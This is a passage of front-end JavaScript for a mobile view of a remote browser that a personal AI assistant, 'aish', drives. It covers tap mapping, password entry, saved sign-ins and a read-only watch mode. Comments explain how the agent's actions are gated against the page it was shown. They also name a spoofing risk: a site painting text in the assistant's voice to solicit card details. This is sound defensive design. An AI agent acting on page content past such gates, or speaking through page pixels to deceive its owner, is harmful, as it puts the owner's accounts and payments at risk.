  if (bvDetailCovers(rect)) return;
  const padW = Math.min(bvFrame.width, rect.w * BV_DETAIL_PAD);
  const padH = Math.min(bvFrame.height, rect.h * BV_DETAIL_PAD);
  const want = {
    x: Math.round(Math.max(0, Math.min(bvFrame.width - padW,
                                       rect.x - (padW - rect.w) / 2))),
    y: Math.round(Math.max(0, Math.min(bvFrame.height - padH,
                                       rect.y - (padH - rect.h) / 2))),
    w: Math.round(padW), h: Math.round(padH),
    scale: Math.round(rect.need * 100) / 100,
  };
  // NOT through bvSend: that guard exists so FRAMES stay ordered, and a patch
  // is neither an interaction nor a thing the page can be changed by. Putting
  // it behind the guard would make a sharpening swallow the next tap. Ordering
  // is handled instead by the token — a patch that arrives after the page has
  // moved on is dropped rather than painted.
  send({ type: "browser_view", action: "detail", token: bvFrameSeq, ...want });
}

/** Lay the patch over the frame in PAGE coordinates.
 *
 *  Positions are computed in the layer's own UNTRANSFORMED box, and the layer
 *  then carries the frame's transform — so zoom and pan move both by exactly
 *  the same amount and the patch can never drift off the thing it sharpens. */
function bvPaintDetail() {
  const layer = $("bv-detail-layer");
  const patch = $("bv-detail");
  if (!layer || !patch) return;
  if (!bvDetail || !patch.src) { layer.hidden = true; return; }
  const stage = $("bv-frame").parentElement.getBoundingClientRect();
  const fit = Math.min(stage.width / bvFrame.width, stage.height / bvFrame.height);
  if (!(fit > 0)) { layer.hidden = true; return; }
  const originX = (stage.width - bvFrame.width * fit) / 2;
  const originY = (stage.height - bvFrame.height * fit) / 2;
  patch.style.left = `${originX + bvDetail.x * fit}px`;
  patch.style.top = `${originY + bvDetail.y * fit}px`;
  patch.style.width = `${bvDetail.w * fit}px`;
  patch.style.height = `${bvDetail.h * fit}px`;
  layer.style.transform = $("bv-frame").style.transform;
  layer.hidden = false;
}

function bvOnDetail(event) {
  // Stale: a frame arrived while this was in flight, so it sharpens a page that
  // is no longer on screen.
  if (event.token !== bvFrameSeq) return;
  // The scale the SERVER captured at, not the one this asked for: the request
  // is clamped there, and believing the request would leave a patch claiming a
  // sharpness it does not have — after which no further trip is ever made.
  bvDetail = { x: event.x, y: event.y, w: event.w, h: event.h, scale: event.scale };
  const patch = $("bv-detail");
  patch.onload = bvPaintDetail;
  patch.src = `data:image/jpeg;base64,${event.jpeg}`;
}
// [BROWSER-VIEW-DETAIL-END]

// [BROWSER-VIEW-COORDS-START]
function browserViewPoint(img, clientX, clientY) {
  // The frame is letterboxed by `object-fit: contain`, so the rendered image
  // is not the element: mapping a tap against the ELEMENT box would be off by
  // the letterbox margin, and every click would land slightly wrong — worst
  // exactly where it matters, on a small login field.
  const box = img.getBoundingClientRect();
  const scale = Math.min(box.width / bvFrame.width, box.height / bvFrame.height);
  const shownW = bvFrame.width * scale;
  const shownH = bvFrame.height * scale;
  const originX = box.left + (box.width - shownW) / 2;
  const originY = box.top + (box.height - shownH) / 2;
  const x = (clientX - originX) / scale;
  const y = (clientY - originY) / scale;
  if (x < 0 || y < 0 || x > bvFrame.width || y > bvFrame.height) return null;
  return { x: Math.round(x), y: Math.round(y) };
}
// [BROWSER-VIEW-COORDS-END]

let bvOpen = false;   // is a remote browser actually running on the Mac?
let bvFocusRect = null;  // the focused field, in FRAME coords, from the last frame
let bvLastNav = -1;      // documents loaded; a change means a new page
let bvBusyTimer = null;

// [BROWSER-VIEW-END-START]
/** End the remote browser if one is running. Called from EVERY route that
 *  hides the sheet, not just the Close button.
 *
 *  A sheet can be dismissed four ways — the button, the ✕, the backdrop, and a
 *  swipe down the grabber — and only the button used to tell the server. The
 *  other three left a browser open on a machine nobody is sitting at, and
 *  because a read refuses while the owner is driving the view, a stray swipe
 *  meant aish could not read ANY page until the 15-minute idle cap expired. */
function bvEndIfOpen() {
  restoreConsoleFocus(); // a browser opened over the console hands typing back
  bvEndWatch();          // ...and a watch dies with the sheet it was shown in
  if (!bvOpen) return;
  bvOpen = false;
  bvIdle();
  bvClearDetail();
  send({ type: "browser_view", action: "close" });
}
// [BROWSER-VIEW-END-END]

// [BROWSER-WATCH-START]
// Watch mode: the same sheet, pointed at the page THIS CHAT is driving, and
// read-only (#289 slice 2). The owner asked for it in one sentence — "I
// actually want to see what it does" — and until now the only account of what
// aish did on a page was a developer's own Chrome.
//
// **`bvWatch` is what makes the sheet read-only, so it has ONE owner.** Set by
// `openWatchView`, cleared by `bvEndWatch`, and read by `bvMayTouchPage` —
// which is the whole of the rule. A stray writer here does not make the sheet
// look wrong; it makes a tap reach the page the model is standing on, which
// costs the model its own gate (see below).
//
// **Why read-only, since it is only a tap.** Every gate decision downstream is
// made against the page as the MODEL was shown it: the submit card's form
// values, the control classification, the act-time re-resolution fence. A
// human scrolling changes the reachable set; a resize crosses a responsive
// breakpoint and control names change. The act-time fence would then correctly
// refuse each act and the flow becomes a refusal storm that reads as the model
// flailing. Temporal separation is the only fix — stepping in is a later slice
// with an approval of its own, and nothing here may anticipate it.
//
// **Nothing aish says is ever rendered inside the frame.** The frame is an
// `<img>` of the site's own document and every word this mode writes goes to
// `#bv-status`, outside it. Structural today, and stated because the residual
// attack is the page painting "aish says: enter your card here" in pixels —
// the answer to which is that nothing in aish's voice is ever composited in.
//
// **And watching relaxes nothing.** #295 P2: no control's safety argument may
// contain "the owner will see it", and a live window is exactly the thing that
// makes that argument tempting. A view is not a control.
let bvWatch = "";   // the chat whose page this sheet WATCHES; "" while driving

/** May the sheet send something that touches the remote page?
 *
 *  The one rule, in one place, with two callers — `bvSend` (every interaction:
 *  click, scroll, goto, back, refresh, resize, the field editor) and
 *  `bvRequestDetail` (which deliberately bypasses `bvSend`). `resize` is worth
 *  naming: in watch mode it does not exist, because a resize would re-lay-out
 *  the page under the model. */
function bvMayTouchPage() { return bvWatch === ""; }

/** What each `idle` reason says, in the owner's terms rather than the code's.
 *  Four closed reasons, matching `browser.WATCH_*` — a free-text reason would
 *  drift between the two ends, the same way `FRAME_ABSENT` would. */
const WATCH_IDLE = {
  "no-page": "aish is not on a page in this chat right now",
  hands: "your own browser has the browser — aish's page here was closed",
  "browser-off": "the browser is switched off",
  failed: "could not get a picture of the page",
};

function openWatchView() {
  if (!currentSession) { showToast("open a chat first"); return; }
  // The owner's own browser and a watch are the same sheet in two modes, so
  // entering one leaves the other. `/browser` outranks — it takes the whole
  // Chrome — and `openBrowserView` ends the watch from its own side.
  bvEndIfOpen();
  bvWatch = currentSession;
  bvProfile = "";
  openSheet("browser-sheet");
  $("browser-sheet").classList.add("bv-watching");
  $("bv-frame").removeAttribute("src");
  bvFocusRect = null;   // the driving view's outline belongs to a page nobody is on
  bvResetZoom();
  $("bv-url").value = "";
  $("bv-url").readOnly = true;   // an address to READ; typing one would navigate
  $("bv-empty").hidden = true;
  $("bv-status").textContent = "watching this chat — looking for aish's page…";
  send({ type: "browser_watch", action: "start" });
}

/** Stop watching. Idempotent, and safe when no watch was running — it hangs
 *  off `bvEndIfOpen`, the one funnel every sheet dismissal already goes
 *  through, for the reason that region records: a sheet can be dismissed four
 *  ways and only the button ever told the server. */
function bvEndWatch() {
  if (!bvWatch) return;
  bvWatch = "";
  $("browser-sheet").classList.remove("bv-watching");
  $("bv-url").readOnly = false;
  send({ type: "browser_watch", action: "stop" });
}

function onBrowserWatch(event) {
  // The session firewall already dropped a frame belonging to another chat;
  // this is the other half — a frame arriving after the sheet was closed, or
  // after it was switched to driving, paints nothing.
  if (!bvWatch || $("browser-sheet").hidden) return;
  if (event.action === "idle") {
    $("bv-frame").removeAttribute("src");
    $("bv-status").textContent = WATCH_IDLE[event.reason] || "no picture";
    return;
  }
  if (event.action !== "frame") return;
  $("bv-frame").src = `data:image/jpeg;base64,${event.jpeg}`;
  $("bv-url").value = event.url || "";
  // Set as TEXT, and outside the picture: the title is the site's own words.
  $("bv-status").textContent = event.title || event.url || "";
}
// [BROWSER-WATCH-END]

function bvIdle() {
  bvBusy = false;
  clearTimeout(bvBusyTimer);
  $("bv-busy").hidden = true;
}

function bvSend(message) {
  if (!bvMayTouchPage()) return false; // watch mode is READ-ONLY ([BROWSER-WATCH])
  if (bvBusy) return false;           // one interaction in flight: frames must stay ordered
  bvBusy = true;
  $("bv-busy").hidden = false;
  // Spread, not Object.assign: the ownership lint finds bare sends by reading
  // the literal `send({ type: "..."`, so building the message dynamically hid
  // this one from the audit entirely rather than declaring it.
  const sent = send({ type: "browser_view", ...message });
  if (!sent) { bvIdle(); return false; }
  // A reply is the only thing that clears the spinner, so a socket that dies
  // mid-interaction would park it forever and the sheet would look wedged with
  // nothing to tap. On a phone reaching a home server, a dropped socket is
  // ordinary weather, not an edge case.
  clearTimeout(bvBusyTimer);
  bvBusyTimer = setTimeout(() => {
    if (!bvBusy) return;
    bvIdle();
    $("bv-status").textContent = "no answer — tap again";
  }, 60000);
  return sent;
}

function onBrowserView(event) {
  if (event.action === "detail") { bvOnDetail(event); return; }
  bvIdle();
  if (event.action === "error") {
    $("bv-status").textContent = `error: ${event.error}`;
    return;
  }
  if (event.action === "recent") { bvRenderRecent(event.items || []); return; }
  if (event.action === "recorded") {
    const hosts = (event.hosts || []).join(", ");
    showToast(hosts ? `signed in: ${hosts}` : "nothing recorded");
    return;
  }
  if (event.action === "closed") {
    bvOpen = false;
    closeSheets();
    // Nothing is ASKED. Whether he is signed in stopped being a fact anybody
    // asserts the moment aish started reading it off the page: a page that has
    // stopped asking for a password, after one went in, is a sign-in — and
    // that is what the server hands back here. Three versions of this question
    // were wrong before it went (inferred from a visit, inferred from a close,
    // then offered as the whole browsing history under one batch yes), and a
    // fourth version of a question nobody can answer reliably was not the fix.
    const hosts = event.hosts || [];
    showToast(
      hosts.length
        ? `browser closed \u2014 signed in to ${hosts.join(", ")}`
        : "browser closed",
    );
    return;
  }
  bvOpen = true;    // a frame means a browser is running on the Mac
  // A new picture of the page: whatever was sharpened may no longer be there,
  // and any patch still in flight was aimed at the old one.
  bvFrameSeq += 1;
  bvClearDetail();
  bvFrame = { width: event.width, height: event.height };
  $("bv-frame").src = `data:image/jpeg;base64,${event.jpeg}`;
  // A goto that threw navigated NOWHERE, so the frame is a white about:blank.
  // Showing it with an empty address bar and no word of explanation is what
  // made the view look broken; keep the typed URL and say what happened.
  if (event.error) {
    $("bv-status").textContent = bvLabel(event.error);
  } else {
    $("bv-url").value = event.url || "";
    $("bv-status").textContent = bvLabel(event.title || event.url || "");
  }
  // --- a NEW DOCUMENT resets the zoom ------------------------------------
  // Counted server-side from real navigations, NOT inferred from the URL
  // changing: a logout that lands on a similar address, an SPA route change
  // and a plain reload all replace the document while the URL may look the
  // same — which is why the zoom survived a Google logout.
  if (typeof event.nav === "number" && event.nav !== bvLastNav) {
    if (bvLastNav !== -1) bvZoom = { scale: 1, x: 0, y: 0 };
    bvLastNav = event.nav;
  }
  $("bv-empty").hidden = true;
  // A password went into this host and the page then moved — which is what a
  // successful sign-in looks like from out here. Ask NOW, naming the site,
  // rather than at the end of the session where two logins are one question.
  // Saved, not asked: the checkbox was the question and he already answered
  // it. This is the receipt, with the one-tap way back out.
  if (event.saved) bvSavedSignin(event.saved);
  // Opening his own browser relaunches the whole Chrome and takes every chat's
  // page with it (#289). Saying so beats a chat quietly discovering, a minute
  // later, that the page it was mid-flow on is gone — a toast, because it is
  // news about somewhere else and there is nothing to decide about it.
  if (event.closed_pages) {
    showToast(
      event.closed_pages === 1
        ? "closed the page aish was on in 1 chat"
        : `closed the pages aish was on in ${event.closed_pages} chats`,
    );
  }
  bvFocusRect = event.focus || null;
  bvPaint(false);   // re-clamp AND redraw the outline for the new geometry
  if (event.focus && event.focus.tapped && event.focus.editable) bvOpenEditor(event.focus);
  else if (event.focus && event.focus.tapped && event.focus.options) bvOpenPicker(event.focus);
}

// [BROWSER-VIEW-EDIT-START]
// Tapping a field opens an editor, because that is what a phone does
// everywhere else. The old design was a text bar living permanently in the
// sheet: it gave no sign which field was focused, offered no way to CORRECT a
// value (it only appended keystrokes), had no clear, and — measured — slid
// under the fold the instant the keyboard it fed opened.
//
// It opens only when the tap landed ON the field. Focus also moves as a side
// effect (pages autofocus their first input; dismissing a cookie banner can
// leave focus in one), and popping an editor then would rebuild the very
// surprise this replaces. The server decides that and sends `tapped`.
let bvEditing = null;   // the focus info being edited

function bvOpenEditor(focus) {
  bvEditing = focus;
  $("bv-edit").hidden = false;
  const secret = focus.kind === "password";
  const input = $("bv-edit-input");
  $("bv-edit-label").textContent = focus.label || (secret ? "Password" : "Field");
  // Inherit the REMOTE field's type, so the phone keyboard is the right
  // keyboard: an email field gets @ and no autocapitalise, a tel field gets
  // the number pad. Typing an email on an alphabetic keyboard with
  // autocapitalise on is its own small misery.
  const KEYBOARDS = {
    email: ["email", "email"], tel: ["tel", "tel"], url: ["url", "url"],
    number: ["text", "decimal"], search: ["search", "search"],
  };
  const [type, mode] = secret ? ["password", "text"]
                              : (KEYBOARDS[focus.type] || ["text", "text"]);
  input.type = type;
  input.inputMode = mode;
  input.autocapitalize = (focus.type === "email" || focus.type === "url") ? "off" : "sentences";
  // A password NEVER arrives pre-filled — the server refuses to read it, so
  // there is nothing to show and nothing was transmitted.
  input.value = secret ? "" : (focus.value || "");
  $("bv-edit-eye").hidden = !secret;
  $("bv-edit-eye").classList.remove("revealed");
  // The remember checkbox belongs to a password field and nothing else. It is
  // reset every time it opens: consent is given for THIS sign-in, and a box
  // left ticked from an hour ago is not consent.
  $("bv-edit-remember").hidden = !secret;
  $("bv-edit-remember-box").checked = false;
  $("bv-edit-note").textContent = secret ? "hidden — typing replaces it" : "";
  input.focus();
  input.setSelectionRange(input.value.length, input.value.length);
  // The editor row takes ~83px OUT of the stage, and everything drawn over the
  // picture is positioned from the stage's box: the focus outline, the zoom
  // clamp, the sharpened patch. Without this they stay where they were before
  // the row appeared — pinned beside the field they are pointing at, which is
  // exactly when an outline matters.
  bvPaint(false);
}


/** Receipt for a stored sign-in. NOT a question — the checkbox was the
 * question and he already answered it.
 *
 * A plain toast rather than an Undo button, deliberately: the way back already
 * exists as `/browser forget <host>`, shared by the CLI and here, and an
 * action slot on the toast would be a new widget standing in for a door that
 * is already open — which is the mistake this file's rules name first. The
 * wording also does not offer to undo the SESSION he just established: that
 * one is the site's, and ending it is his to do there. */
function bvSavedSignin(origin) {
  const host = origin.replace(/^https?:\/\//, "");
  showToast(`saved your ${host} sign-in — /browser forget ${host} deletes it`);
}

function bvCloseEditor() {
  // Cleared on the way out: this input holds passwords, and a value left in a
  // DOM node outlives the dialog.
  $("bv-edit-input").value = "";
  $("bv-edit-input").type = "text";
  $("bv-edit").hidden = true;
  bvEditing = null;
  bvPaint(false);   // the stage grows back; see bvOpenEditor
}

// Editing a value and SUBMITTING a form are two different acts, and offering
// them as two similar buttons ("Set" / "Set & submit") made both unclear. Now:
// the button only puts the value in the field, and the keyboard's own Go key
// submits — which is how a form works in every browser.
/** Leaving the field KEEPS what you typed, as it would on a real page. */
function bvCommitAndClose() {
  if (!bvEditing) return false;
  return bvCommit(false);
}

function bvCommit(submit) {
  const text = $("bv-edit-input").value;
  // Send BEFORE clearing: bvSend refuses while an interaction is in flight,
  // and clearing first silently destroyed the text — a password, typically —
  // with nothing on screen to say so.
  const secret = !!(bvEditing && bvEditing.kind === "password");
  if (!bvSend({ action: "fill", text, submit, secret,
                remember: secret && $("bv-edit-remember-box").checked })) {
    $("bv-edit-note").textContent = "still working — try again in a moment";
    return;
  }
  bvCloseEditor();
}

function wireBrowserEditor() {
  $("bv-edit-clear").addEventListener("click", () => {
    $("bv-edit-input").value = "";
    $("bv-edit-input").focus();
  });
  $("bv-edit-eye").addEventListener("click", () => {
    const input = $("bv-edit-input");
    const shown = input.type === "text";
    input.type = shown ? "password" : "text";
    $("bv-edit-eye").classList.toggle("revealed", !shown);
    $("bv-edit-eye").setAttribute("aria-label", shown ? "show password" : "hide password");
    input.focus();
  });
  $("bv-edit-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") { e.preventDefault(); bvCommit(true); }   // submit
    if (e.key === "Escape") { e.preventDefault(); bvCloseEditor(); } // discard
  });
  $("bv-url-clear").addEventListener("click", () => {
    $("bv-url").value = "";
    $("bv-url").focus();
  });
}
wireBrowserEditor();

/** Chrome draws a <select> with NATIVE UI, which `page.screenshot` cannot
 *  capture — so tapping one produced a frame that looked completely inert,
 *  the same dead end as the passkey prompt. The options come up with the frame
 *  and the phone draws its own list. */
function bvOpenPicker(focus) {
  const list = $("bv-picker-list");
  list.textContent = "";
  $("bv-picker-label").textContent = focus.label || "Choose";
  for (const option of focus.options) {
    const button = document.createElement("button");
    button.type = "button";
    button.textContent = option.label;
    if (option.chosen) button.className = "chosen";
    button.addEventListener("click", () => {
      $("bv-picker").hidden = true;
      bvSend({ action: "choose", value: option.value });
    });
    list.appendChild(button);
  }
  $("bv-picker").hidden = false;
}

/** Outline whatever the page has focused, in the frame's own coordinates.
 *  His first complaint was that tapping gave no sign of what got selected. */
function bvPaintFocus(focus) {
  const box = $("bv-focus");
  const img = $("bv-frame");
  if (!box) return;
  if (!focus || !focus.rect || !focus.rect.w) { box.hidden = true; return; }
  // Same contain-fit geometry the tap mapper inverts, read fresh each time so
  // it tracks the transform.
  const r = img.getBoundingClientRect();
  const stage = img.parentElement.getBoundingClientRect();
  const scale = Math.min(r.width / bvFrame.width, r.height / bvFrame.height);
  const originX = r.left + (r.width - bvFrame.width * scale) / 2 - stage.left;
  const originY = r.top + (r.height - bvFrame.height * scale) / 2 - stage.top;
  box.style.left = `${originX + focus.rect.x * scale}px`;
  box.style.top = `${originY + focus.rect.y * scale}px`;
  box.style.width = `${focus.rect.w * scale}px`;
  box.style.height = `${focus.rect.h * scale}px`;
  box.hidden = false;
}
// [BROWSER-VIEW-EDIT-END]

// [BROWSER-VIEW-RECENT-START]
/** The places this browser has been, one row per site, newest first.
 *
 *  Built from the SERVER's list rather than from localStorage, which is what
 *  the single Resume button used: where aish's browser has been is a fact
 *  about that one Chrome on that one Mac, not about the phone looking at it,
 *  so it has to read the same from every device.
 *
 *  Rows are per HOST because the alternative is useless in exactly the case
 *  the owner named: search from here a few times and the ten most recent pages
 *  are ten google.com rows, pushing off the list the address he actually
 *  opened this to find. */
function bvRenderRecent(items) {
  const box = $("bv-recent");
  box.textContent = "";
  box.hidden = !items.length;
  for (const item of items) {
    const row = document.createElement("button");
    row.className = "bv-recent-row";
    row.type = "button";
    const host = document.createElement("span");
    host.className = "bv-recent-host";
    host.textContent = item.host || item.url;
    row.appendChild(host);
    if (item.title) {
      const title = document.createElement("span");
      title.className = "bv-recent-title";
      title.textContent = item.title;
      row.appendChild(title);
    }
    if (item.profile === "search") {
      // WHICH browser this row would reopen in. Two profiles, and reopening a
      // page in the wrong one silently changes which sessions are attached.
      const tag = document.createElement("span");
      tag.className = "bv-recent-anon";
      tag.textContent = "anonymous profile";
      row.appendChild(tag);
    }
    row.addEventListener("click", () => openBrowserView(item.url, item.profile));
    box.appendChild(row);
  }
}
// [BROWSER-VIEW-RECENT-END]

// Which profile the OPEN view is driving, so a frame arriving later can be
// stored with the right one.
let bvProfile = "";

/** Every status line, tagged with the profile when it is not the owner's.
 *
 *  It has to survive the FIRST FRAME, which is where the first version of this
 *  failed: the label was written once at open and the frame handler then
 *  replaced the whole line with the page title, so by the time there was
 *  anything to sign into, nothing on screen said which browser you were in.
 *  The two profiles are pixel-identical and mean opposite things — one carries
 *  every session the owner has, the other carries none — and a password typed
 *  into the wrong one is a mistake nothing else on the page would reveal. */
function bvLabel(text) {
  return bvProfile === "search"
    ? `${text} · search profile (signed into nothing)`
    : text;
}

function openBrowserView(url, profile) {
  // His own browser OUTRANKS a watch, and takes the whole Chrome with it: the
  // server counts the chats whose page this is about to close and says so on
  // the frame (`closed_pages`). Leaving the mode first is what puts the sheet
  // back in its driving shape.
  bvEndWatch();
  bvProfile = profile === "search" ? "search" : "";
  openSheet("browser-sheet");
  $("bv-frame").removeAttribute("src");
  bvResetZoom();
  $("bv-url").value = url || "";
  if (!url) {
    // An empty browser should INVITE, not present a black rectangle with a
    // line of text under it. It offered exactly ONE page — the last one — which
    // answers "carry on where you left off" and nothing else; ten pages back is
    // where the address you cannot remember actually lives.
    $("bv-empty").hidden = false;
    $("bv-status").textContent = "";
    bvSend({ action: "recent" });   // server-side: the same list on every device
    $("bv-url").focus();
    return;
  }
  $("bv-empty").hidden = true;
  // WHICH browser this is has to be visible. The two profiles look identical
  // on screen and mean opposite things — one carries every session the owner
  // has, the other carries none — so a sign-in typed into the wrong one is a
  // mistake nothing else would reveal.
  $("bv-status").textContent = bvLabel(`opening ${url}…`);
  bvSend(Object.assign({ action: "open", url, profile: bvProfile },
                       bvViewportSize()));
}

/** The SHAPE the remote page should be laid out at: the stage we will show it
 *  in. The server scales that shape up to a desktop width — a phone-shaped
 *  viewport was measured and reverted (docs/browser.md) — so what this is
 *  measured for is the ASPECT, which is what leaves nothing to letterbox. */
function bvViewportSize() {
  // The page is asked for at EXACTLY the stage's shape, so `object-fit:
  // contain` has nothing to letterbox and the frame fills the width.
  //
  // Asking for a taller page than the stage was the bug: a 390x828 page shown
  // in a 430x549 stage fits by HEIGHT, so it rendered at 0.66 scale with black
  // bars down both sides — about 60% of the available width wasted, which is
  // what the owner photographed. Matching the aspect also means scale 1.0, so
  // the page is shown at its own size rather than shrunk.
  const stage = $("bv-frame").parentElement.getBoundingClientRect();
  const width = Math.round(stage.width) || Math.round(window.innerWidth);
  const height = Math.round(stage.height) || Math.round(window.innerHeight * 0.6);
  return { width, height };
}

function wireBrowserView() {
  const img = $("bv-frame");

  img.addEventListener("pointerdown", (e) => {
    // Tapping the page while a field is open LEAVES the field, keeping what
    // was typed — the same thing that happens when you tap away from a field
    // on any page. The tap is spent on leaving, not forwarded as a click, so
    // dismissing cannot also press something.
    if (bvEditing) { bvCommitAndClose(); return; }
    if (!$("bv-picker").hidden) { $("bv-picker").hidden = true; return; }
    bvPointers.set(e.pointerId, { x: e.clientX, y: e.clientY });
    if (bvPointers.size === 2) {
      const [a, b] = [...bvPointers.values()];
      bvPinchFrom = { dist: Math.hypot(a.x - b.x, a.y - b.y), scale: bvZoom.scale };
      bvDragFrom = null;
    } else if (bvPointers.size === 1) {
      bvDragFrom = {
        x: e.clientX, y: e.clientY, lastY: e.clientY,
        zoom: { ...bvZoom }, moved: 0,
      };
    }
  });

  img.addEventListener("pointermove", (e) => {
    if (!bvPointers.has(e.pointerId)) return;
    bvPointers.set(e.pointerId, { x: e.clientX, y: e.clientY });
    if (bvPinchFrom && bvPointers.size === 2) {
      const [a, b] = [...bvPointers.values()];
      const dist = Math.hypot(a.x - b.x, a.y - b.y);
      if (bvPinchFrom.dist > 0) {
        bvZoom.scale = Math.max(1, Math.min(BV_MAX_ZOOM,
          bvPinchFrom.scale * (dist / bvPinchFrom.dist)));
        bvPaint(false);
      }
      return;
    }
    if (!bvDragFrom) return;
    const dx = e.clientX - bvDragFrom.x;
    const dy = e.clientY - bvDragFrom.y;
    bvDragFrom.lastY = e.clientY;
    bvDragFrom.moved = Math.max(bvDragFrom.moved, Math.hypot(dx, dy));
    if (bvZoom.scale > 1) {
      bvZoom = { scale: bvZoom.scale, x: bvDragFrom.zoom.x + dx, y: bvDragFrom.zoom.y + dy };
      bvPaint(false);
      e.preventDefault();
    }
  }, { passive: false });

  const release = (e) => {
    if (!bvPointers.has(e.pointerId) && !bvDragFrom) return;
    const wasDrag = bvDragFrom;
    const pinching = bvPointers.size >= 2 || bvPinchFrom;
    bvPointers.delete(e.pointerId);
    if (bvPointers.size < 2) bvPinchFrom = null;
    if (bvPointers.size === 0) bvDragFrom = null;
    // A pinch or a pan that has ended may have gone past what the frame
    // carries. Scheduled, not sent: the settle timer is what keeps a gesture
    // in several parts from costing a trip per part.
    if (bvPointers.size === 0) bvScheduleDetail();
    if (pinching || !wasDrag) return;
    if (wasDrag.moved > BV_TAP_SLOP) {
      // A SWIPE SCROLLS THE PAGE. At 1x there is nothing to pan — the frame
      // already fills the stage — so a drag that did nothing was the single
      // most natural gesture on a phone going to waste, leaving the ▲/▼
      // buttons as the only way down a page. Zoomed in, the drag has already
      // panned (above) and must not also scroll.
      if (bvZoom.scale === 1) {
        // The RELEASE's own position, not the last pointermove: Chrome
        // coalesces and drops moves under load, so trusting the last one seen
        // measures a shorter swipe than the finger made — or none at all.
        const endY = Number.isFinite(e.clientY) ? e.clientY : wasDrag.lastY;
        const travelled = endY - wasDrag.y;
        if (Math.abs(travelled) > BV_TAP_SLOP) {
          // Finger up = page down, as everywhere else.
          bvSend({ action: "scroll", dy: Math.round(-travelled * bvPageScale()) });
        }
      }
      return;
    }

    if (bvTapTimer) {                    // the second tap of a pair: ZOOM ONLY
      clearTimeout(bvTapTimer);
      bvTapTimer = null;
      if (bvZoom.scale > 1) bvResetZoom();
      else bvZoomAt(2.5, e.clientX, e.clientY);
      bvScheduleDetail();
      return;
    }
    if (!bvMayTouchPage()) {
      // Watch mode ([BROWSER-WATCH]): a tap presses nothing. The timer is still
      // armed, because zoom is client-side and stays — without it the second
      // tap of a pair would take the first-tap path and double-tap would not
      // zoom. No tap marker either: local feedback for an action that will not
      // happen is a lie about what the tap did.
      bvTapTimer = setTimeout(() => { bvTapTimer = null; }, BV_DOUBLE_TAP_MS);
      return;
    }
    const point = browserViewPoint(img, e.clientX, e.clientY);
    if (!point) return;
    bvMarkTap(e.clientX, e.clientY);     // instant local feedback while we wait
    bvTapTimer = setTimeout(() => {
      bvTapTimer = null;
      bvSend({ action: "click", x: point.x, y: point.y });
    }, BV_DOUBLE_TAP_MS);
  };
  // The outline is measured from the image's live geometry, and a settling
  // zoom ANIMATES over 180ms — so the paint that happens as the animation
  // STARTS measures the old size and the outline stays put while the field
  // slides away under it. Repaint when the transform finishes.
  img.addEventListener("transitionend", (e) => {
    if (e.propertyName === "transform") bvPaintFocus(bvFocusRect);
  });
  // Belt and braces with draggable="false": some paths still raise dragstart,
  // and one is enough to cancel the pointer stream mid-swipe.
  img.addEventListener("dragstart", (e) => e.preventDefault());
  img.addEventListener("pointerup", release);
  // A release that lands OUTSIDE the frame still ends the gesture. Without
  // this a swipe that drifted off the edge left the drag hanging: no scroll,
  // and the next tap inherited a stale drag. (Pointer CAPTURE is the usual fix
  // and is deliberately avoided here — on an <img> it silently breaks drags,
  // the same lesson the photo viewer records.)
  window.addEventListener("pointerup", (e) => {
    if (bvDragFrom && !$("browser-sheet").hidden) release(e);
  });
  img.addEventListener("pointercancel", (e) => {
    bvPointers.delete(e.pointerId);
    bvPinchFrom = null;
    if (!bvPointers.size) bvDragFrom = null;
  });
  // Focusing the address selects ALL of it, as every browser does — so the
  // next keystroke replaces the URL and a long-press offers Copy on the whole
  // thing, instead of dropping a caret into the middle of it.
  $("bv-url").addEventListener("focus", (e) => e.target.select());
  // No Go button. The address bar is submitted with the keyboard's own Go key
  // (`enterkeyhint="go"`), which is how every mobile browser works — a separate
  // button is chrome for something the keyboard already offers.
  $("bv-url").addEventListener("keydown", (e) => {
    if (e.key !== "Enter") return;
    e.preventDefault();
    e.target.blur();     // let the keyboard go; the frame is what to look at
    bvSend(Object.assign(
      { action: "goto", url: $("bv-url").value.trim() }, bvViewportSize()));
  });
  // The size rides along with every navigation action: if the view has been
  // reaped (15 minutes idle) the server reopens it, and it needs to know the
  // shape to open at.
  $("bv-back").addEventListener("click", () =>
    bvSend(Object.assign({ action: "back" }, bvViewportSize())));
  $("bv-refresh").addEventListener("click", () =>
    bvSend(Object.assign({ action: "refresh", url: $("bv-url").value.trim() },
                         bvViewportSize())));
  // A rotation or a keyboard changes the shape of the page we are showing, so
  // the remote page is RE-LAID-OUT rather than the frame being stretched.
  let resizeTimer = null;
  window.addEventListener("resize", () => {
    if ($("browser-sheet").hidden) return;
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => {
      const size = bvViewportSize();
      bvSend(Object.assign({ action: "resize" }, size));
    }, 350);
  });
}
wireBrowserView();

function openMicSheet() {
  openSheet("mic-sheet");
  micContext();
  $("mic-interim").textContent = "—";
  $("mic-final").textContent = "—";
  $("mic-log").textContent = "";
  micLogLine(`ready · lang ${micLang}`);
}

function startMic() {
  if (!SpeechRec) { micLogLine("cannot start: no SpeechRecognition in this browser"); return; }
  try {
    micRec = new SpeechRec();
    micRec.lang = micLang;
    micRec.continuous = true;
    micRec.interimResults = true;
    micRec.onstart = () => micLogLine("onstart (mic live — say something)");
    micRec.onaudiostart = () => micLogLine("onaudiostart");
    micRec.onspeechstart = () => micLogLine("onspeechstart");
    micRec.onspeechend = () => micLogLine("onspeechend");
    micRec.onresult = (e) => {
      let interim = "", final = "";
      for (let i = e.resultIndex; i < e.results.length; i++) {
        const chunk = e.results[i][0].transcript;
        if (e.results[i].isFinal) final += chunk; else interim += chunk;
      }
      if (interim) $("mic-interim").textContent = interim;
      if (final) {
        $("mic-final").textContent = final;
        micLogLine(`onresult FINAL: ${final.trim()}`);
      }
    };
    micRec.onerror = (e) => micLogLine(`onerror: ${e.error}${e.message ? " — " + e.message : ""}`);
    micRec.onend = () => {
      micListening = false;
      setMicToggle();
      micLogLine("onend (recognition stopped — iOS often ends after a silence)");
    };
    micRec.start();
    micListening = true;
    setMicToggle();
  } catch (err) {
    micLogLine(`start() threw: ${err.name} — ${err.message}`);
    micListening = false;
    setMicToggle();
  }
}

function stopMic() {
  if (micRec) {
    try { micRec.stop(); } catch { /* already stopped */ }
    micRec = null;
  }
  micListening = false;
  setMicToggle();
}

function setMicToggle() {
  const btn = $("mic-toggle");
  if (!btn) return;
  btn.textContent = micListening ? "Stop" : "Start listening";
  btn.classList.toggle("listening", micListening);
}

$("mic-toggle").onclick = () => (micListening ? stopMic() : startMic());
for (const btn of document.querySelectorAll(".mic-lang")) {
  btn.onclick = () => {
    micLang = btn.dataset.lang;
